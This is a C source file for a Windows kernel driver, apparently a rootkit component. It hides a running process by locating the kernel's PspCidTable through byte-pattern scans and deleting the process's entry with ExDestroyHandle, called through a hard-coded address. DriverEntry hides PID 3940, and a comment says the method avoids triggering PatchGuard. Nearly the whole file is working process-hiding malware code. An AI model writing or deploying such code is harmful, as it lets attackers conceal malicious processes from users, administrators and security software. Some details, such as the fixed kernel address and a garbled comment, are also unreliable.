#include "Imports.h"

// Get the address of this table
PHANDLE_TABLE GetPspCidTable()
{
	// We are able to get the address of exported function PsLookupProcessByProcessId,
	// then we can find the address of PspReferenceCidTableEntry, which makes a reference to the PspCidTable

	UNICODE_STRING szPsLookUpName;
	PVOID pPsLookup = 0;
	PVOID pPspReference = 0;
	ULONG pPspReferenceOffset = 0;
	ULONG PspCidTableOffset = 0;
	PVOID PspCidTable = 0;
	SIZE_T i = 0;

	RtlInitUnicodeString(&szPsLookUpName, L"PsLookupProcessByProcessId");
	pPsLookup = MmGetSystemRoutineAddress(&szPsLookUpName);
	if (!pPsLookup)
	{
		DbgPrintEx(0, 77, "PsLookupProcessByProcessId cannot be found\n");
		return 0;
	}

	DbgPrintEx(0, 77, "PsLookupProcessByProcessId: %p\n", pPsLookup);

//PAGE:0000000140665F82 B2 03                          mov     dl, 3
//PAGE:0000000140665F84 E8 77 01 00 00                 call    PspReferenceCidTableEntry
	
	//The call to PspReferenceCidTableEntry is a RIP + sizeof(instruction) + offset

	//iterate the memory to find the relative call
	for (i = 0; i < 0x100; i++)
	{
		//mov dl, 3
		//call Psp
		//DbgPrintEx(0, 77, "%hhx\n", *(PBYTE)((ULONG64)pPsLookup + i));
		if (*(PBYTE)((ULONG64)pPsLookup + i) == 0xB2 && *(PBYTE)((ULONG64)pPsLookup + i + 1) == 0x03 && *(PBYTE)((ULONG64)pPsLookup + i + 2) == 0xE8)
		{
			pPspReferenceOffset = *(ULONG*)((ULONG64)pPsLookup + i + 3);
			//instruction + instruction size + offset
			pPspReference = (PVOID)((ULONG64)pPsLookup + i + 3 + sizeof(ULONG) + pPspReferenceOffset);
			break;
		}
	}

	if (pPspReferenceOffset == 0 || pPspReference == 0)
	{
		DbgPrintEx(0, 77, "PspReferenceCidTableEntry cannot be found\n");
		return 0;
	}

	DbgPrintEx(0, 77, "PspReferenceCidTableEntry Relative call: %d\n", pPspReference);


	//now we have the PspReferenceCidTableEntry, we can find the PspCidTable
//PAGE:0000000140666116 48 83 EC 40                             sub     rsp, 40h
//PAGE:000000014066611A 48 8B 05 AF 54 69 00                    mov     rax, cs:PspCidTable

	//iterate the memory to find the relative object
	for (i = 0; i < 0x100; i++)
	{
		//mov     rax, cs:PspCidTable
		if (*(PBYTE)((ULONG64)pPspReference + i) == 0x48 && *(PBYTE)((ULONG64)pPspReference + i + 1) == 0x8B && *(PBYTE)((ULONG64)pPspReference + i + 2) == 0x05)
		{
			PspCidTableOffset = *(ULONG*)((ULONG64)pPspReference + i + 3);
			//instruction + instruction size + offset
			PspCidTable = (PVOID)((ULONG64)pPspReference + i + 3 + sizeof(ULONG) + PspCidTableOffset);
			break;
		}
	}

	if (PspCidTableOffset == 0 || PspCidTable == 0)
	{
		DbgPrintEx(0, 77, "PspCidTable cannot be found\n");
		return 0;
	}

	DbgPrintEx(0, 77, "PspCidTable Relative Object: %d\n", pPspReference);

	return *(PHANDLE_TABLE*)PspCidTable;
}

//from ida interpretation of the function ExpLookupHandleTableEntry
//v3 = (volatile signed __int64 *)ExpLookupHandleTableEntry(PspCidTable, a1);
__int64 __fastcall ExpLookupHandleTableEntry(unsigned int* a1, __int64 a2)
{
	unsigned __int64 v2; // rdx
	__int64 v3; // r8

	v2 = a2 & 0xFFFFFFFFFFFFFFFC;
	if (v2 >= *a1)
		return 0;
	v3 = *((__int64*)a1 + 1);
	if ((v3 & 3) == 1)
		return *(__int64*)(v3 + 8 * (v2 >> 10) - 1) + 4 * (v2 & 0x3FF);
	if ((v3 & 3) != 0)
		return *(__int64*)(*(__int64*)(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF)) + 4 * (v2 & 0x3FF);
	return v3 + 4 * v2;
}

PVOID SigScan(PVOID Buffer, SIZE_T SizeOfBuffer, PVOID Signature, SIZE_T SizeOfSignature)
{
	BOOL flip = 0;
	if (SizeOfSignature > SizeOfBuffer)
	{
		return NULL;
	}

	DbgPrintEx(0, 77, "Buffer: %p\n", Buffer);

	PCHAR Memory = (PCHAR)Buffer;
	PCHAR sig = (PCHAR)Signature;
	for (size_t i = 0; i < (SizeOfBuffer - SizeOfSignature); ++i)
	{
		flip = 0;
		for (size_t o = 0; o < SizeOfSignature; ++o)
		{
			if (sig[o] != 0x00 && Memory[i + o] != sig[o])
			{
				flip = 1;
				break;
			}
		}
		if(flip == 0) return &Memory[i];
		/*if (!memcmp(&Memory[i], Signature, SizeOfSignature))
		{
			return &Memory[i];
		}*/
	}

	DbgPrintEx(0, 77, "couldn't scan sig\n");

	return NULL;
}

PVOID GetNtosBaseAddress()
{

	ULONG_PTR         ntosbase = 0;

	PVOID             tempaddr = NULL;

	UNICODE_STRING    apiname = { 0 };

	RtlInitUnicodeString(&apiname, L"PsLookupProcessByProcessId");

	//get the address of an ntoskrnl function
	tempaddr = MmGetSystemRoutineAddress(&apiname);

	//find the base address lol
	RtlPcToFileHeader((PVOID)tempaddr, &tempaddr);

	return tempaddr;
}

//BBScanSection
PVOID GetTextSectionFromBaseAddress(ULONG_PTR  moudlebase, PCHAR  sectionname, PULONG  outmoudlesize)
{
	ULONG        moudlesize = 0;

	ULONG_PTR    pagestart = 0;

	ULONG_PTR    pageend = 0;

	if (!moudlebase)
	{
		return 0;
	}

	//
	//ÄÃseticon
	//
	PIMAGE_NT_HEADERS pHdr = RtlImageNtHeader((PVOID)moudlebase);


	if (!pHdr)
	{
		return 0;
	}

	PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + 1);

	for (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection < pFirstSection + pHdr->FileHeader.NumberOfSections; pSection++)
	{
		ANSI_STRING s1, s2;

		RtlInitAnsiString(&s1, sectionname);

		RtlInitAnsiString(&s2, (PCCHAR)pSection->Name);

		if (RtlCompareString(&s1, &s2, TRUE) == 0)
		{
			pagestart = moudlebase + pSection->VirtualAddress;

			pageend = moudlebase + pSection->VirtualAddress + pSection->Misc.VirtualSize;

			*outmoudlesize = pSection->Misc.VirtualSize;

			break;
		}
	}
	if (!pagestart)
	{
		return 0;
	}

	return (PVOID)pagestart;
}

//PAGE:000000014069A6DD 48 8B 0D EC 0E 66 00                    mov     rcx, cs:PspCidTable
//PAGE:000000014069A6E4 E8 7F 03 00 00                          call    ExDestroyHandle
//PAGE:000000014069A6E9 49 8B CC                                mov     rcx, r12
//PAGE:000000014069A6EC E8 1F 09 B7 FF                          call    KeLeaveCriticalRegionThread

static unsigned char pattern_exDestroy[] = { 0xE8, 0x00,  0x00,  0x00,  0x00,  0x49,  0x8B,  0xCC,  0xE8,  0x00,  0x00,  0x00,  0x00,  0x48,  0x8B,  0xCF };


//http://www.codewarrior.cn/ntdoc/wrk/ex/ExDestroyHandle.htm
typedef BOOLEAN (*ExDestroyHandle)(__inout PHANDLE_TABLE HandleTable,
	__in HANDLE Handle,
	__inout_opt PHANDLE_TABLE_ENTRY HandleTableEntry);

BOOL HideProcess(DWORD pid)
{
	PHANDLE_TABLE PspCidTable = GetPspCidTable();
	ULONG64 i = 0;
	PHANDLE_TABLE_ENTRY entry = 0;
	ULONG64 ExDestroyHandlePtr = 0;
	ULONG textsize;
	PVOID textstart;

	if (PspCidTable == NULL) return FALSE;

	textstart = GetTextSectionFromBaseAddress((ULONG64)GetNtosBaseAddress(), ".text", &textsize);

	//ExDestroyHandlePtr = (ULONG64)SigScan(textstart, textsize, pattern_exDestroy, sizeof(pattern_exDestroy)) + 1;

	////E8 is a relative call, check the position
	//unsigned int offset = *(unsigned int*)ExDestroyHandlePtr;
	//ExDestroyHandlePtr = ExDestroyHandlePtr + (ULONG64)offset + 4;

	//TODO: find a more viable way of finding this function
	ExDestroyHandlePtr = (ULONG64)0xfffff805050611d8;

	//Some sort of lookup entry function in PsLookupProcessId
	entry = (PHANDLE_TABLE_ENTRY)ExpLookupHandleTableEntry((unsigned int*)PspCidTable, pid);

	if (entry != 0)
	{
		//from looking at PspProcessDelete, 
		//ExDestroyHandle can handle deletion without triggering PG
		
		((ExDestroyHandle)ExDestroyHandlePtr)(PspCidTable, (HANDLE)pid, entry);


		DbgPrintEx(0, 77, "success!\n");

		return TRUE;
	}

	DbgPrintEx(0, 77, "failed to delete...\n");
	return FALSE;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObj)
{
	return;
}

EXTERN_C NTSTATUS   DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)
{
	driver->DriverUnload = DriverUnload;

	HideProcess(3940);

	return STATUS_SUCCESS;
}



//
//
//
//
//VOID EnumProcess()
//{
//	PULONG_PTR PspCidTable;
//	PHANDLE_TABLE HandleTable;
//	PHANDLE_TABLE_ENTRY TableLevel1, * TableLevel2;
//	PVOID ObjectType;
//	PVOID Object;
//	UINT32 i, j, k;
//
//
//	PspCidTable = GetPspCidTable();
//	if (!PspCidTable)
//	{
//		return;
//	}
//	HandleTable = (PHANDLE_TABLE)*PspCidTable;
//
//
//	// table level
//	switch (HandleTable->TableCode & 0x3)
//	{
//	case 0:
//		TableLevel1 = (PHANDLE_TABLE_ENTRY)(HandleTable->TableCode & ~0x3);
//		KdPrint(("TableLevel1:%p\n", TableLevel1));
//		if (!TableLevel1)
//		{
//			break;
//		}
//		for (i = 0; i < 0x1000 / 16; i++)
//		{
//			if (TableLevel1[i].Object && MmIsAddressValid(TableLevel1[i].Object))
//			{
//				// mask out three low
//				Object = (PVOID)((ULONG_PTR)(TableLevel1[i].Object) & ~0x7);
//				ObjectType = ObGetObjectType(Object);
//				if (ObjectType == *PsProcessType)
//				{
//					KdPrint(("PID:%d,Object:%p\n", i * 4, Object));
//				}
//			}
//		}
//		break;
//	case 1:
//		TableLevel2 = (PHANDLE_TABLE_ENTRY*)(HandleTable->TableCode & ~0x3);
//		KdPrint(("TableLevel2:%p\n", TableLevel2));
//		for (i = 0; i < (HandleTable->NextHandleNeedingPool / (0x1000 / 16 * 4)); i++)
//		{
//			TableLevel1 = TableLevel2[i];
//			KdPrint(("TableLevel1:%p\n", TableLevel1));
//			if (!TableLevel1)
//			{
//				break;
//			}
//			for (j = 0; j < 0x1000 / 16; j++)
//			{
//				if (TableLevel1[j].Object && MmIsAddressValid(TableLevel1[j].Object))
//				{
//					// we mask out three low
//					Object = (PVOID)((ULONG_PTR)(TableLevel1[j].Object) & ~0x7);
//					ObjectType = ObGetObjectType(Object);
//					if (ObjectType == *PsProcessType)
//					{
//						KdPrint(("PID:%d,Object:%p,Name:%s\n", (i * (0x1000 / 16) + j) * 4, Object, PsGetProcessImageFileName(Object)));
//
//					}
//				}
//			}
//		}
//		break;
//	default:
//		break;
//	}
//
//}
